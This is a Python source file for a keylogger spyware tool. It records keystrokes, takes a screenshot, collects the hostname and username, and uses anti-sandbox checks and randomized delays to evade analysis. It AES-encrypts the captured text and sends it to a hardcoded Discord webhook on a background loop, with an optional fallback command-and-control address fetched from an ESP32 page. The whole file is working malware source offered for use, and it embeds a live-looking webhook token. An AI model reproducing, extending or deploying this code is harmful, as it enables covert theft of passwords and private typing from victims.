import os, re, time, random, datetime, requests, threading, base64, socket, subprocess
from pynput import keyboard
import mss
from hashlib import sha256
import getpass as gt
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad
import psutil

# === ORIGINAL CORE VARIABLES ===
current_time = datetime.datetime.now()
username = os.path.expanduser('~')
file_path = "sys32.txt"  # Not used anymore, preserved
discord = "https://discord.com/api/webhooks/1405520151142600726/pdA3Whgfdlt0HycRmvjK4Uih36uNChuknDFN8C3RqZRFsi_T-UnVY9BL6tTIXAv2tu26"
esp_page = ""  # Optional fallback C2 redirect
current_word = ""
buffer = []


with mss.mss() as sct:
    # The monitor or screen part to capture
    monitor = sct.monitors[1]  # or a region

    # Grab the data
    sct_img = sct.grab(monitor)

    # Generate the PNG
    png_binary = mss.tools.to_png(sct_img.rgb, sct_img.size)
    png_base64 = base64.b64encode(png_binary).decode('utf-8')
 
with open("filebyte.txt", "a") as fb:
    fb.write(f"{png_base64}")
    

def screenshot():
    with mss.mss() as sct:
        filename = sct.shot(output="screenshot.png")
    print(f"Screenshot saved as {filename}")

# === PHASE 1: Anti-Sandbox / Evasion ===
def evade_sandbox():
    try:
        if time.time() - psutil.boot_time() < 180:
            exit()
        if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:
            exit()
        import pyautogui
        if not pyautogui.position():
            exit()
    except:
        exit()
    time.sleep(random.randint(15, 60))  # Delayed start

# === PHASE 2: Dynamic Webhook via ESP32 ===
def get_dynamic_url():
    if not esp_page:
        return None
    try:
        html = requests.get(esp_page, timeout=5).text
        m = re.search(r'(https?://\S+)', html)
        if m:
            return m.group(1).strip()
    except:
        return None

# === PHASE 3: AES + reverse + base64 encoder ===
def encrypt_buffer(data, key=b'supersecretkey'):
    key = sha256(key).digest()
    cipher = AES.new(key, AES.MODE_ECB)
    encrypted = cipher.encrypt(pad(data.encode(), 16))
    return base64.b64encode(encrypted[::-1]).decode()

# === ORIGINAL FUNCTION: Logging time (no file write) ===
def time_log():
    pass  # disabled file output to stay diskless

# === ORIGINAL KEYLOGGER CORE ===
def on_press(key):
    global current_word
    try:
        ch = key.char
    except AttributeError:
        if key == keyboard.Key.backspace:
            current_word = current_word[:-1]
        elif key == keyboard.Key.space:
            write_word(current_word, "space")
            current_word = ""
        elif key == keyboard.Key.enter:
            write_word(current_word, "enter")
            current_word = ""
        return
    if ch and len(ch) == 1:
        current_word += ch

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def write_word(word, how):
    entry = f"Word completed with {how}: {word}"
    buffer.append(entry)

# === EXFIL FUNCTION: Uses Discord with AES encryption ===
def send_buffer(url):
    if not buffer:
        return
    raw_text = "\n".join(buffer)
    encrypted_payload = encrypt_buffer(raw_text)
    data = {"content": encrypted_payload}
    headers = {
        "User-Agent": "DiscordBot (https://discordapp.com, v1.0)",
        "Content-Type": "application/json",
        "X-Safe": str(random.randint(1000, 9999))
    }
    try:
        r = requests.post(url, json=data, headers=headers)
        print("Server replied:", r.status_code)  # for debug only
    except Exception as e:
        print("Send failed:", e)  # for debug only


def  sys_info():
    compturename = socket.gethostname()
    username = gt.getuser( )
    print(f"Hostname:", compturename,username)
    #homename = platform.node( )


# === BACKGROUND EXFIL THREAD ===
def sender_loop(url):
    while True:
        send_buffer(url)
        delay = random.randint(10, 60)
        time.sleep(delay)

# === LISTENER WRAPPER ===
def start():
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    listener.join()

# === MAIN ===
if __name__ == "__main__":
    evade_sandbox()

    dynamic_url = get_dynamic_url()
    if dynamic_url:
        discord = dynamic_url
    time.sleep(random.randint(15, 360))
    sys_info()
    threading.Thread(target=sender_loop, args=(discord,), daemon=True).start()
    buffer.append(f"Session Started at: {current_time}")
    start()
    time_log()
